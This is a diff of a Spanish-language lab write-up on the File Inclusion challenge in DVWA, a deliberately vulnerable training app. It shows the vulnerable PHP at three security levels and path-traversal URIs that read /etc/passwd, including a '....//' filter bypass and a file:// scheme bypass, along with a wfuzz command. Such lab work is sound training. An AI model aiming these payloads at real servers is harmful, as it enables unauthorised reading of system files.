@@ -1,30 +1,39 @@
 # FI
 
-## Nivel: `bajo`
+File inclusion es una vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor. Esto puede ser utilizado para leer archivos sensibles como `passwd` o para leer el código fuente de la aplicación.
 
-### source
+La vulnerabilidad se puede distinguir en dos tipos:
 
-```php
-<?php
+- **[Local File Inclusion (LFI)](LFI.md)**: Se produce cuando el archivo que se incluye se encuentra en el mismo servidor que la aplicación vulnerable.
+- **[Remote File Inclusion (RFI)](RFI.md)**: Se produce cuando el archivo que se incluye se encuentra en otro servidor.
 
-// The page we wish to display
-$file = $_GET[ 'page' ];
+Durante el desarrollo de la actividad se descrubió que existia también el fichero `file4.php` que no se mencionaba en la documentación pero que si que se podía acceder a el mediante la URI:
 
-?> 
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=file4.php
 ```
 
-### vulnerability check
+![file4](/FI/assets/file4.png)
+
+## Nivel: `bajo`
+
+### Código vulnerable
+```php
+$file = $_GET[ 'page' ];
+```
+
+Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:
 
 ```
 http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
-![check1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check1.png)
+![check1](/FI/assets/check-low.png)
 
 ---
 
-Durante la realización del nivel bajo se probo la herramienta `wfuzz` para hacer fuzzing de la URI, pero no se obtuvo ningún resultado extra.
-Realmente el uso de la herramienta no nos ayudo a solucionar el reto de este nivel, pero si que nos ayudo a entender como funciona la herramienta y posibles usos de la misma.
+Durante la realización del nivel bajo se probó la herramienta `wfuzz` para hacer fuzzing de la URI, pero no se obtuvo ningún resultado extra.
+Realmente el uso de la herramienta no nos ayudo a solucionar el reto, pero si que nos ayudo a entender como funciona la herramienta y posibles usos de la misma.
 
 ```
 wfuzz -c --hl 81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -b "security=low; PHPSESSID=eboalr1aom47l322etbqjebovg" "http://localhost/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
@@ -50,72 +59,39 @@ Requests/sec.: 0
 
 ## Nivel: `medio`
 
-### source
+
+### Código vulnerable
 
 ```php
-<?php
-
-// The page we wish to display
 $file = $_GET[ 'page' ];
-
-// Input validation
 $file = str_replace( array( "http://", "https://" ), "", $file );
 $file = str_replace( array( "../", "..\\" ), "", $file );
-
-?> 
 ```
 
-### vulnerability check
+Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:
 
 ```
 http://localhost/DVWA/vulnerabilities/fi/?page=....//....//....//....//....//....//etc/passwd
 ```
 
-![check2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/check2.png)
+![check-mid](/FI/assets/check-mid.png)
 
 ## Nivel: `alto`
 
-### source
+### Código vulnerable
 
 ```php
-<?php
-
-// The page we wish to display
 $file = $_GET[ 'page' ];
-
-// Input validation
-if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
-    // This isn't the page we want!
-    echo "ERROR: File not found!";
-    exit;
-}
-
-?> 
+if (!fnmatch( "file*", $file ) && $file != "include.php") {exit}
 ```
 
-### vulnerability check
+Para comprobar que la aplicación es vulnerable a la vulnerabilidad de `FI` se puede utilizar la siguiente URI:
 
-## Nivel: `imposible`
-
-### source
-
-```php
-<?php
-
-// The page we wish to display
-$file = $_GET[ 'page' ];
-
-// Only allow include.php or file{1..3}.php
-if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
-    // This isn't the page we want!
-    echo "ERROR: File not found!";
-    exit;
-}
-
-?> 
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
 ```
 
-### vulnerability check
+![check-high](/FI/assets/check-high.png)
 
 ## Referencias
 
